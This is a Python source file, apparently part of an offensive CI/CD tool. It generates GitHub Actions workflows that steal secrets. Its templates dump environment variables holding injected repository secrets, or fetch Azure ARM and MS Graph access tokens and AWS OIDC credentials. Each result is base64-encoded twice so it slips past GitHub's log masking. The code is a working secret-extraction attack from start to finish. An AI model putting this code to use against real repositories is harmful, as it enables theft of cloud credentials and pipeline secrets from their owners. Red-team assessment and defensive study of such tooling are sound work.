from nordstream.utils.log import logger
from nordstream.yaml.generator import YamlGeneratorBase


class WorkflowGenerator(YamlGeneratorBase):
    _defaultTemplate = {
        "name": "GitHub Actions",
        "on": "push",
        "jobs": {
            "init": {
                "runs-on": "ubuntu-latest",
                "steps": [
                    {
                        "run": "env -0 | awk -v RS='\\0' '/^secret_/ {print $0}' | base64 -w0 | base64 -w0",
                        "name": "command",
                        "env": None,
                    }
                ],
            }
        },
    }

    _OIDCAzureTokenTemplate = {
        "name": "GitHub Actions",
        "on": "push",
        "permissions": {"id-token": "write", "contents": "read"},
        "jobs": {
            "init": {
                "runs-on": "ubuntu-latest",
                "environment": None,
                "steps": [
                    {
                        "name": "login",
                        "uses": "azure/login@v1",
                        "with": {"client-id": None, "tenant-id": None, "allow-no-subscriptions": True},
                    },
                    {
                        "name": "command",
                        "run": '(echo "Access token to use with Azure Resource Manager API:"; az account get-access-token; echo -e "\nAccess token to use with MS Graph API:"; az account get-access-token --resource-type ms-graph) | base64 -w0 | base64 -w0',
                    },
                ],
            }
        },
    }

    _OIDCAWSTokenTemplate = {
        "name": "GitHub Actions",
        "on": "push",
        "permissions": {"id-token": "write", "contents": "read"},
        "jobs": {
            "init": {
                "runs-on": "ubuntu-latest",
                "environment": None,
                "steps": [
                    {
                        "name": "login",
                        "uses": "aws-actions/configure-aws-credentials@v1-node16",
                        "with": {"role-to-assume": None, "role-session-name": "oidcrolesession", "aws-region": None},
                    },
                    {
                        "name": "command",
                        "run": "sh -c 'env | grep \"^AWS_\" | base64 -w0 | base64 -w0'",
                    },
                ],
            }
        },
    }

    def generateWorkflowForSecretsExtraction(self, secrets, env=None):
        self.addSecretsToYaml(secrets)
        if env is not None:
            self.addEnvToYaml(env)

    def generateWorkflowForOIDCAzureTokenGeneration(self, tenant, subscription, client, env=None):
        self._defaultTemplate = self._OIDCAzureTokenTemplate
        self.addAzureInfoForOIDCToYaml(tenant, subscription, client)

        if env is not None:
            self.addEnvToYaml(env)

    def generateWorkflowForOIDCAWSTokenGeneration(self, role, region, env=None):
        self._defaultTemplate = self._OIDCAWSTokenTemplate
        self.addAWSInfoForOIDCToYaml(role, region)

        if env is not None:
            self.addEnvToYaml(env)

    def addEnvToYaml(self, env):
        try:
            self._defaultTemplate.get("jobs").get("init")["environment"] = env
        except TypeError as e:
            logger.exception(e)

    def getEnv(self):
        try:
            return self._defaultTemplate.get("jobs").get("init").get("environment", None)
        except TypeError as e:
            logger.exception(e)

    def addSecretsToYaml(self, secrets):
        self._defaultTemplate.get("jobs").get("init").get("steps")[0]["env"] = {}
        for sec in secrets:
            key = f"secret_{sec}"
            value = f"${{{{secrets.{sec}}}}}"
            self._defaultTemplate.get("jobs").get("init").get("steps")[0].get("env")[key] = value

    def addAzureInfoForOIDCToYaml(self, tenant, subscription, client):
        self._defaultTemplate["jobs"]["init"]["steps"][0]["with"]["tenant-id"] = tenant
        self._defaultTemplate["jobs"]["init"]["steps"][0]["with"]["client-id"] = client

        if subscription:
            self._defaultTemplate["jobs"]["init"]["steps"][0]["with"]["subscription-id"] = subscription

    def addAWSInfoForOIDCToYaml(self, role, region):
        self._defaultTemplate["jobs"]["init"]["steps"][0]["with"]["role-to-assume"] = role
        self._defaultTemplate["jobs"]["init"]["steps"][0]["with"]["aws-region"] = region
